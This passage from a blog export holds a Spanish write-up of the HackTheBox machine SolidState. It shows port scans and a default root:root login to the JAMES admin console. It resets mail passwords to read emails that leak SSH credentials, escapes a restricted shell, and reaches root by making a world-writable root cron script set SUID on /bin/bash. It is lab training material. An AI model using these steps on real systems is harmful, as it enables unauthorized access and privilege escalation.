-p. Al ejecutarlo y convertirnos en root podremos visualizar la flag de este usuario.\n","date":"2023-08-23T00:00:00Z","permalink":"/p/writeup-inject/","title":"WriteUp Inject"},{"content":"Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.\nParámetro → Descripción\n-p- → Escanea el rango completo de puertos(65535 puertos). \u0026ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. \u0026ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts. -oG → Guardar el output en formato grepeable. 1 2 3 4 5 6 7 8 9 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG allports PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 25/tcp open smtp syn-ack ttl 63 80/tcp open http syn-ack ttl 63 110/tcp open pop3 syn-ack ttl 63 119/tcp open nntp syn-ack ttl 63 4555/tcp open rsip syn-ack ttl 63 Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos. Parámetro → Descripción\n-sC → Muestra todos los scripts relacionados con el servicio. -sV → Determina la version del servicio. -p → Escanea sobre los peurtos especificados. -oN → Guarda el output en un arcivo con formato normal. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 770084f578b9c7d354cf712e0d526d8b (RSA) | 256 78b83af660190691f553921d3f48ed53 (ECDSA) |_ 256 e445e9ed074d7369435a12709dc4af76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.9 [10.10.16.9]) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open rsip? | fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2 | Please enter your login and password | Login id: | Password: | Login failed for |_ Login id: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4555-TCP:V=7.93%I=7%D=3/16%Time=641341A4%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,7C,\u0026#34;JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\.2\\nPl SF:ease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\nPasswo SF:rd:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n\u0026#34;); Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration Antes de enumerar el puerto 4555, habría que enumerar todos los puertos anteriores. En mi caso no encontré nada.\nPodemos conectarnos a RSIP mediante nc o telnet, en mi caso usé telnet. Cuando nos intentamos conectar nos pide usuario y contraseña, probamos root:root y vemos que funciona.Una vez dentro podemos ejecutar el comando HELP para ver los comandos que podemos ejecutar.\nListamos los usuarios que hay con listusers y vemos que hay 5 existentes.Cambiamos la contraseña a todos los usuarios para despues probar a conectarnos al servicio de correos POP3 y poder ver que tiene cada no de ellos en su bandeja de entrada.Para cambiar la contraseña usamos el comando setpassword \u0026lt;usuario\u0026gt; \u0026lt;contraseña\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 telnet 10.10.10.51 4555 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands listusers Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin setpassword john live Password for john reset setpassword mindy live Password for mindy reset Una vez cambiadas la contraseñas es hora de conectarse y enumerar el servicio POP3 .Primero nos conectamos como John,una vez dentro para ver los correos usamos el comando list y podemos ver que solo hay un correo. Para poder ver el contenido usamos RETR 1. Viendo el contenido nos damos cuentas de que John le ha puesto una contraseña temporal a Mindy.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER john +OK PASS live +OK Welcome john list +OK 1 743 1 743 . RETR 1 +OK Message follows Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;9564574.1.1503422198108.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;john@localhost\u0026gt;; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy`s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James Ahora nos conectamos como Mindy y vemos que tiene dos correos.Seleccionamos el segundo correo para ver el contenido y observamos que hay usuario y contraseña los cuales pueden sernos útil para usar en el servicio SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy +OK PASS live +OK Welcome mindy LIST +OK 2 1945 1 1109 2 836 RETR 2 +OK Message follows Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;16744123.2.1503422270399.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;mindy@localhost\u0026gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James Privilege Escalation Nos conectamos mediante SSH con el usuario Mindy y la contraseña que obtuvimos anteriormente. Una vez dentro nos vamos a dar cuenta de que hay comando que no vamos a poder ejecutar, esto se trata porque nos encontramos bajo una restricted bash . Aun así somo capaces de visualizar la flag de user.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ssh mindy@10.10.10.51 The authenticity of host \u0026#39;10.10.10.51 (10.10.10.51)\u0026#39; can`t be established. ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.10.51\u0026#39; (ECDSA) to the list of known hosts. mindy@10.10.10.51`s password: Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142 mindy@solidstate:~$ cat user.txt 5a1fbcfb4abde72621e0f2a7bc42a7d0 Para poder escapar de esta restricted vas hay varias maneras, yo lo hice a traves del servidor apache que hay en el puerto 4555 Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2) → https://www.exploit-db.com/exploits/50347 Simplemente es usar el exploit y segir lo pasos que hay en el mismo.\nOtra forma de escapar de la restricted bash seria simplemente con SSH la cual seria de la siguiente manera ssh mindy@\u0026lt;IP\u0026gt; bash\nUna vez dentro nos descargamos en nuetra máquina de atacante la herramienta pspy y despues la pasamos a la máquina víctima.Le damos permisos de ejecución a la herramienta y la lanzamos.\n1 2 3 4 5 pspy32 2023/03/16 13:06:01 CMD: UID=0 PID=3698 | /bin/sh -c python /opt/tmp.py 2023/03/16 13:06:01 CMD: UID=0 PID=3699 | python /opt/tmp.py 2023/03/16 13:06:01 CMD: UID=0 PID=3700 | 2023/03/16 13:06:01 CMD: UID=0 PID=3701 | sh -c rm -r /tmp/* Vemos que se esta ejecutando cada cierto tiempo un script en python el cual es tmp.py, además que lo está ejecutando el usuario root. Podemos ver su contenido y vemos qe no hace nada del otro mundo, borra de forma recursiva todo lo qe haya en la carpeta /tmp.\n1 2 3 4 5 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l total 8 drwxr-xr-x 11 root root 4096 Apr 26 2021 james-2.3.2 -rwxrwxrwx 1 root root 137 Mar 16 13:08 tmp.py ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 1 2 3 4 5 6 7 #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /tmp/* \u0026#39;) except: sys.exit() Simplmente podemos añadir una línea en la cual le asignemos permisos SUID a la bash.\n1 2 3 4 5 6 7 8 #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /tmp/* \u0026#39;) except: sys.exit() os.system(\u0026#39;chmod u+s /bin/bash\u0026#39;) Una vez modificado el script, solo toca esperar a que apareza una \u0026rsquo;s\u0026rsquo; en el primer triplete de los permisos de los archivos. Una vez haya aparecido esta \u0026rsquo;s\u0026rsquo; podremos ejecutar el siguiente comando para obtener una bash de forma privilegiada: bash -p.\nUna vez ejecutado podremos viusalizar la flag de root.\n1 2 3 4 5 6 7 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l /bin/bash -rwsr-xr-x 1 root root 1265272 May 15 2017 /bin/bash ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ bash -p bash-4.4# id uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy) bash-4.4# cat /root/root.txt 4d934c7b9c3bfd2914d3bd8b1c013f31 ","date":"2023-08-23T00:00:00Z","permalink":"/p/writeup-solidstate/","title":"WriteUp SolidState"}]